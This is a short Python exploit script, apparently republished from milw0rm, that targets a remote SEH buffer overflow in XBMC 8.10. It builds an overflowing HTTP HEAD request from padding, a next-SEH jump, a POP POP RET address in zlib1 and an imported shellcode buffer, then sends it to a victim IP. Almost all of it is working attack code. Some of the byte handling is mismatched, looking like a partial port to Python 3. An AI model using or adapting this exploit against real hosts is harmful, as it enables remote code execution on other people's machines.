#!/usr/bin/python
#[*] Usage : exploit.py [victime_ip]
#[*] Bug : 	    XBMC 8.10 (HEAD Request) Remote Buffer Overflow Exploit (SEH)
#[*] Refer :        http://www.milw0rm.com/exploits/8354
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com,secdz.com
#[*] Chi3arona houa : Serra7 merra7,koulchi mderra7 :D


#!/usr/bin/env python 
import socket
import struct
from struct import pack
from payload import buf
def shell_attack(target_machine, target_port):

    host = target_machine

    buff1 = b'A'*998

    Pointer_To_Next_SEH = struct.pack(b'<L',0x909006eb)

    ###
    ###This was found in the module zlib1 and is universal.
    #62E83BAC   5B               POP EBX
    #62E83BAD   5D               POP EBP
    #62E83BAE  ^E9 CDD9FFFF      JMP zlib1.compressBound
    SE_Handler = struct.pack(b'<L',0x62E83BAC)

    # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
    
    buff2 = b'B'*635

    payload = buff1 + Pointer_To_Next_SEH + SE_Handler + buf + buff2

    head  = "HEAD /"+str(payload)+" HTTP/1.1\r\n"
    head += "Host: "+host+"\r\n"


    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,target_port))
    s.send(head + "\r\n\r\n")
    s.close()

    # milw0rm.com [2009-04-07]